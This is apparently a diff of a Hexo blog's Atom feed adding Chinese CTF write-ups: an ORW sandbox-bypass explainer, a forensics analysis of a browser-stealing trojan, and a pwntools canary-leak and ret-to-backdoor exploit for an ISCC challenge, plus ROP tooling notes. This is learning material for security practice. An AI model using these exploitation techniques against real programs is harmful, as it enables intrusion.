@@ -6,7 +6,7 @@
   <link href="https://www.xvzhang.fun/atom.xml" rel="self"/>
   
   <link href="https://www.xvzhang.fun/"/>
-  <updated>2025-05-13T02:43:27.740Z</updated>
+  <updated>2025-05-15T05:55:54.642Z</updated>
   <id>https://www.xvzhang.fun/</id>
   
   <author>
@@ -17,11 +17,59 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>pwn-ORW</title>
+    <link href="https://www.xvzhang.fun/posts/153dbd9f.html"/>
+    <id>https://www.xvzhang.fun/posts/153dbd9f.html</id>
+    <published>2025-05-14T14:56:20.000Z</published>
+    <updated>2025-05-15T05:55:54.642Z</updated>
+    
+    <content type="html"><![CDATA[<h1>pwn知识-ORW</h1><p>在CTF赛事中，越来越多的题目启用了沙箱，会禁用掉<code>execve</code>函数，从而达到让我们构造不出来<code>system('/bin/sh\x00')</code>来<code>getshell</code>的效果，这个时候我们就可以利用<strong>orw</strong>来解题。</p><h2 id="原理">原理</h2><p>见名知意，<code>ORW</code>与三个函数有关：<code>open</code>、<code>read</code>、<code>write</code>，他们的作用分别是：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">open打开想要读取的文件</span><br><span class="line">read将打开的文件内容读取</span><br><span class="line">write将读取到的内容输出</span><br></pre></td></tr></table></figure><h2 id="攻击方式">攻击方式</h2><p>在知晓大概的流程之后，就得设置寄存器的参数，我们需要知道函数对应参数代表的含义：<br><code>open(file,oflag)</code>,<code>read(fd,buf,n_bytes)</code>,<code>write(fd,buf,n_bytes)</code>。<br><strong>open</strong><br><code>file</code>就是我们要读取的文件名，<code>oflag</code>指的是我们以何种方式打开文件，如只读，只写，可读可写。一般我们设置<code>oflag=0</code>，默认打开，只读即可。<br><strong>read</strong>，<strong>write</strong>，这两个大同小异。<br><code>fd</code>是文件描述符，通过设置它来决定函数的操作，通常设置为<code>0</code>，表示标准输入，但是在<code>ORW</code>中，我们需要设置<code>read</code>的<code>fd</code>参数为<code>3</code>，表示从文件中读取，则<code>buf</code>中存放的就是读入文件内容的地址，<code>n_bytes</code>就是能够存入多少字节的数据。<code>write</code>的<code>fd</code>设置为<code>1</code>，输出到终端。</p>]]></content>
+    
+    
+    <summary type="html">上次比赛遇到了关于ORW的题目，这里作一个学习</summary>
+    
+    
+    
+    <category term="CTF" scheme="https://www.xvzhang.fun/categories/CTF/"/>
+    
+    
+    <category term="CTF" scheme="https://www.xvzhang.fun/tags/CTF/"/>
+    
+    <category term="PWN" scheme="https://www.xvzhang.fun/tags/PWN/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>外网打点-信息收集</title>
+    <link href="https://www.xvzhang.fun/posts/6e1eba3b.html"/>
+    <id>https://www.xvzhang.fun/posts/6e1eba3b.html</id>
+    <published>2025-05-14T05:01:46.000Z</published>
+    <updated>2025-05-15T08:38:53.078Z</updated>
+    
+    <content type="html"><![CDATA[<h1>外网打点</h1>]]></content>
+    
+    
+    <summary type="html">信息收集是渗透测试中极为重要的一环</summary>
+    
+    
+    
+    <category term="渗透测试" scheme="https://www.xvzhang.fun/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+    <category term="渗透测试" scheme="https://www.xvzhang.fun/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    <category term="信息收集" scheme="https://www.xvzhang.fun/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
+    
+    <category term="外网打点" scheme="https://www.xvzhang.fun/tags/%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/"/>
+    
+  </entry>
+  
+  <entry>
     <title>盘古石计算机取证大赛-WP</title>
     <link href="https://www.xvzhang.fun/posts/ef89deac.html"/>
     <id>https://www.xvzhang.fun/posts/ef89deac.html</id>
     <published>2025-05-10T03:53:26.000Z</published>
-    <updated>2025-05-13T02:43:27.740Z</updated>
+    <updated>2025-05-14T14:44:05.899Z</updated>
     
     <content type="html"><![CDATA[<h1>计算机取证</h1><ol start="9"><li>计算机装过一款反取证软件为？【标准格式：EnCrypt.exe】 What anti-forensic software was installed on the computer? [Answer example: EnCrypt.exe]<br>VeraCrypt.exe<br>计算机分析软件分析得出<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101352132.png" alt="alt text"></li></ol><h1>EXE取证</h1><ol><li>分析Windows木马，其控制端ip是？[标准格式：192.168.1.11] Analyze the Windows trojan virus: What is its controller IP? [Answer format: 192.168.1.11]<br>104.18.45.79<br>在虚拟仿真系统安全中心中发现，然后将该程序下载下来，丢到微步云沙箱上，得到答案。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101416224.png" alt="alt text"><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101418490.png" alt="alt text"><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101418010.png" alt="alt text"></li><li>软件会复制自身到哪个文件夹下？[标准格式：DaTa] Which folder does the malware copy itself to? [Answer format: DaTa]<br>SubDir<br>根据微步沙箱分析，确定是复制到该文件夹下<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101421678.png" alt="alt text"></li><li>接上题，复制后软件名称是？[标准格式：AppTmp.exe] Continuing last question, What is the copied filename? [Answer format: AppTmp.exe]<br>BwAcr.exe<br>由上题可知，复制后软件名称。</li><li>软件一共可以窃取多少种浏览器的信息？[标准格式：3] How many types of browsers can the malware extract data from? [Answer format: 3]<br>8<br>利用<code>exeinfo</code>检查发现，是<code>.Net</code>架构程序<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101746068.png" alt="alt text"><br>遂使用<code>dnSpy</code>进行反编译，发现存在混淆<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101747723.png" alt="alt text"><br>使用<code>de4dot</code>工具进行反混淆<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101744187.png" alt="alt text"><br>然后使用<code>dnSpy</code>进行反编译后审计。<br>在<code>GClass15</code>中发现它有逻辑进行判断，刚开始以为他在读取<code>chromium</code>浏览器的数据，最后发现这是当未检测到存在浏览器时会返回的信息。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101638633.png" alt="alt text"><br><code>GClass16</code>读取<code>Brave-Browser</code>浏览器信息<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101640744.png" alt="alt text"><br><code>GClass17</code>读取<code>google-chrome</code>浏览器信息<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101642109.png" alt="alt text"></li></ol><p><code>GClass18</code>读取<code>edge</code><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101642557.png" alt="alt text"><br><code>GClass19</code>读取<code>Opera GX</code><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101642920.png" alt="alt text"><br><code>GClass20</code>读取<code>Opera</code><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101644701.png" alt="alt text"></p><p><code>GClass21</code>读取<code>YandexBrowser</code><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101644224.png" alt="alt text"><br><code>GClass23</code>读取<code>firefox</code><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101646726.png" alt="alt text"><br><code>GClass24``GClass25</code>读取<code>Internet Explorer</code><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101649221.png" alt="alt text"><br>原本计算为9个，结果尝试提交发现分值没有发生变化，回去再仔细审计，发现<code>15</code>定义的检查系统中是否存在指定浏览器的操作，所以应该是8个。<br>5. 软件查询安装的杀毒软件出错或异常会返回什么字符串？[标准格式：Apps] What error message is returned when the malware fails to detect antivirus software? [Answer format: Apps]<br>Unknown<br><code>GClass61</code>定义了该方法，会回复<code>Unknown</code><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101700613.png" alt="alt text"></p>]]></content>
     
@@ -33,6 +81,10 @@
     <category term="CTF" scheme="https://www.xvzhang.fun/categories/CTF/"/>
     
     
+    <category term="盘古石杯" scheme="https://www.xvzhang.fun/tags/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF/"/>
+    
+    <category term="电子取证" scheme="https://www.xvzhang.fun/tags/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/"/>
+    
   </entry>
   
   <entry>
@@ -40,9 +92,9 @@
     <link href="https://www.xvzhang.fun/posts/5bbfef93.html"/>
     <id>https://www.xvzhang.fun/posts/5bbfef93.html</id>
     <published>2025-05-10T03:53:01.000Z</published>
-    <updated>2025-05-13T02:43:08.852Z</updated>
+    <updated>2025-05-14T14:44:22.143Z</updated>
     
-    <content type="html"><![CDATA[<h1>pwn</h1><h2 id="pwn01-genius">pwn01-genius</h2><p>You are a genius?<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101155336.png" alt="alt text"><br>开启NX以及cannary保护<br>IDA反编译查看，找到后门函数<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101156338.png" alt="alt text"><br>程序从main函数开始，依次满足条件从function1执行到3，触发栈溢出。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101157376.png" alt="alt text"></p>]]></content>
+    <content type="html"><![CDATA[<h1>pwn</h1><h2 id="pwn01-genius">pwn01-genius</h2><p>You are a genius?<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101155336.png" alt="alt text"><br>开启NX以及cannary保护<br>IDA反编译查看，找到后门函数<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101156338.png" alt="alt text"><br>程序从main函数开始，依次满足条件从function1执行到3，触发栈溢出。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101157376.png" alt="alt text"><br>我们重点看这里<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505131748416.png" alt="alt text"><br>看第一段读取，它会将存在栈上的<code>buf</code>格式化输出出来，并且这里存在溢出，所以我们在这里利用栈溢出来泄露<code>cannary</code>的值。<br>并且，<code>init()</code>函数是后门函数<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505131751046.png" alt="image.png.png"><br>所以我们泄露出<code>cannary</code>的值后利用<code>gets()</code>栈溢出到后门函数这里即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&#x27;./pwn&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">sh.sendlineafter(<span class="string">b&quot;you are a genius,yes or no?&quot;</span>, <span class="string">b&#x27;no&#x27;</span>)  </span><br><span class="line">sh.sendlineafter(<span class="string">b&quot;Sir, don&#x27;t be so modest.&quot;</span>, <span class="string">b&#x27;thanks&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">backdoor_addr = <span class="number">0x04011A6</span>  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x19</span>  </span><br><span class="line">  </span><br><span class="line">sh.sendafter(<span class="string">b&#x27;what you want in init&#x27;</span>, payload)  </span><br><span class="line">  </span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x19</span>)  </span><br><span class="line">canary = u64(sh.recv(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))  </span><br><span class="line">log.success(<span class="string">f&quot;cannary: <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&quot;</span>)  </span><br><span class="line"><span class="comment"># gdb.attach(sh)  </span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(canary) + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x08</span> + p64(<span class="number">0x04011B8</span>) + p64(backdoor_addr)  </span><br><span class="line">sh.sendlineafter(<span class="string">b&quot;thank you&quot;</span>, payload)  </span><br><span class="line">  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
     
     
     <summary type="html">iscc挑战赛，咱就是说，平台是真卡</summary>
@@ -51,6 +103,10 @@
     
     <category term="CTF" scheme="https://www.xvzhang.fun/categories/CTF/"/>
     
+    
+    <category term="CTF" scheme="https://www.xvzhang.fun/tags/CTF/"/>
+    
+    <category term="ISCC" scheme="https://www.xvzhang.fun/tags/ISCC/"/>
     
   </entry>
   
@@ -185,7 +241,7 @@
     <link href="https://www.xvzhang.fun/posts/1b534064.html"/>
     <id>https://www.xvzhang.fun/posts/1b534064.html</id>
     <published>2025-05-07T07:06:59.000Z</published>
-    <updated>2025-05-10T14:59:44.000Z</updated>
+    <updated>2025-05-14T14:58:13.343Z</updated>
     
     <content type="html"><![CDATA[<h1>堆栈平衡</h1><p>堆栈平衡是指在函数调用过程中，确保堆栈在进入和结束时保持一致。函数执行前到ret执行之前，堆栈栈顶的地址必须是<code>call</code>指令的下一个地址。如果堆栈变化了，需要在ret执行前将堆栈恢复称原来的样子，以确保程序能回到正确的位置。</p><p>64位ubuntu18以上系统调用system函数时是需要栈对齐的。因为64位下system函数存在<code>movaps</code>指令，这个指令要求内存地址必需16字节对齐。<br>因为64位程序的地址是8字节的，而十六进制是满16进位，所以64位程序的栈地址末尾为<code>0或8</code>，只有当地址末尾是0的时候，才算是与16字节对齐了，如果末尾是8，就是没有对齐，所以如果要在ubuntu18以上的64位程序中执行system函数，必须要保证system地址末尾为0。<br>程序在执行一个对栈指令(如<code>pop、ret、push</code>等，<code>mov</code>这样的不算对栈的操作指令)，则栈地址就会<code>+8</code>或<code>-8</code>，为了使rsp对齐16字节，核心思想就是增加或者减少栈内容，使<code>rsp</code>地址能相应的增加或减少8字节，利用这样的方式来对齐16字节。因为栈中地址都是以<code>0</code>或<code>8</code>结尾，0已经对齐16字节，因此只需要进行奇数次pop或者push操作，就能把地址是8结尾的rsp变为0结尾，使其16字节对齐。</p><ol><li>去将system函数地址+1，也就是跳过一条栈操作指令，使rsp对齐。</li><li>直接在调用system函数地址之前去调用一个ret指令。ret指令等同于pop rip，该指令使rsp+8，从而完成rsp16字节对齐，实现了栈对齐。<br><a href="https://www.bilibili.com/video/BV15W4y1N7yN/?spm_id_from=top_right_bar_window_dynamic.content.click&amp;vd_source=42c0bbf1fee01fedba3e9853a8c831a1">pwn技术分享—执行system前为何要执行retn指令</a><br><a href="https://www.cnblogs.com/ZIKH26/articles/15996874.html">关于ubuntu18版本以上调用64位程序中的system函数的栈对齐问题</a></li></ol><h1>偏移量计算</h1><h2 id="GDB-peda计算偏移">GDB-peda计算偏移</h2><p><strong>64位程序</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb ./pwn  </span><br><span class="line">pattern create 200</span><br></pre></td></tr></table></figure><p>复制生成的200个测试字节，下断点到输入函数<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/c70c70bc-e74e-4991-a7a7-242c934c2c5d.png" alt="alt text"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ni</span><br></pre></td></tr></table></figure><p>输入刚刚的测试字符<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/b951aab4-7c3f-4ff1-8067-322864435067.png" alt="alt text"><br>可以看到，程序崩溃，若程序未崩溃，则要添加更多的测试字节数。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/c2e5fe86-8041-418e-ac1f-2b1549722780.png" alt="alt text"><br>复制RBP这里的八个字节，然后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pattern offset 6AALAAhA</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/31620a82-f4e7-480b-b165-60f42f184328.png" alt="alt text"><br>得到计算出得偏移为96<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/01691e64-91f6-4eeb-8be6-14e8ef4bcabc.png" alt="alt text"><br>我们验证一下：<br>输入96+8字节（因为是64位程序），刚好覆盖掉RBP寄存器<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/d49b551c-e7c4-41f7-b995-aab29e1e5362.png" alt="alt text"></p><h3 id="GDB-PWNdbg计算偏移">GDB-PWNdbg计算偏移</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb ./pwn  </span><br><span class="line">cyclic 200</span><br></pre></td></tr></table></figure><p>生成200个字节，然后下断点运行到输入点，输入上述生成的200字节，程序报错，找到RBP的地址，复制。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/1423f756-1d3d-40f6-9c7a-8d29cbd9491d.png" alt="alt text"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyclic -l 0x616161616161616d</span><br></pre></td></tr></table></figure><p>同样计算出偏移为96<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/25b7b240-1b1c-4ead-aa06-e5934357d05c.png" alt="alt text"></p><h1>ret2libc工具</h1><h2 id="ROPgadget">ROPgadget</h2><p>获取<code>gadget</code>地址，<code>--binary</code>参数指定文件，可以是可执行文件或<code>libc</code>文件，<code>grep</code>用于筛选，<code>--string</code>用于筛选字符串</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">ROPgadget --binary ./pwn --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;rdi&#x27;</span> <span class="comment">#控制寄存器的值</span></span>  </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">ROPgadget --binary ./pwn --string <span class="string">&#x27;/bin/sh&#x27;</span> <span class="comment">#查找字符串</span></span>  </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">ROPgadget --binary ./libc-2.35.so --only <span class="string">&#x27;leave|ret&#x27;</span> | grep <span class="string">&#x27;leave&#x27;</span> <span class="comment">#查找leave ret指令地址</span></span>  </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">ROPgadget --binary ./pwn --ropchain <span class="comment">#生成现成的rop利用链直接getshell，适用于静态编译的程序</span></span>  </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">ROPgadget --binary ./pwn --only <span class="string">&#x27;ret&#x27;</span> <span class="comment">#查找ret指令的地址</span></span></span><br></pre></td></tr></table></figure><h3 id="patchelf">patchelf</h3><p>更改可执行文件的动态链接文件，更改<code>ld</code>可以直接指定<code>ld</code>文件，而更改<code>libc</code>需要先使用<code>ldd</code>查看原<code>libc</code>作为<code>--replace-needed</code>选项的第一个参数，一般默认是<code>libc.so.6</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">patchelf --replace-needed libc.so.6 ./2.38/libc.so.6 ./pwn <span class="comment">#更改libc</span></span>  </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">patchelf --set-interpreter ./2.35/ld-linux-x86-64.so.2 ./pwn <span class="comment">#更改ld</span></span></span><br></pre></td></tr></table></figure><h3 id="onegadget">onegadget</h3><p>能直接getshell的gadget，添加参数<code>-l2</code>可以获得更多</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget ./libc.so.6</span><br></pre></td></tr></table></figure>]]></content>
     
@@ -197,7 +253,9 @@
     <category term="CTF" scheme="https://www.xvzhang.fun/categories/CTF/"/>
     
     
-    <category term="CTF,PWN" scheme="https://www.xvzhang.fun/tags/CTF-PWN/"/>
+    <category term="CTF" scheme="https://www.xvzhang.fun/tags/CTF/"/>
+    
+    <category term="PWN" scheme="https://www.xvzhang.fun/tags/PWN/"/>
     
   </entry>
   
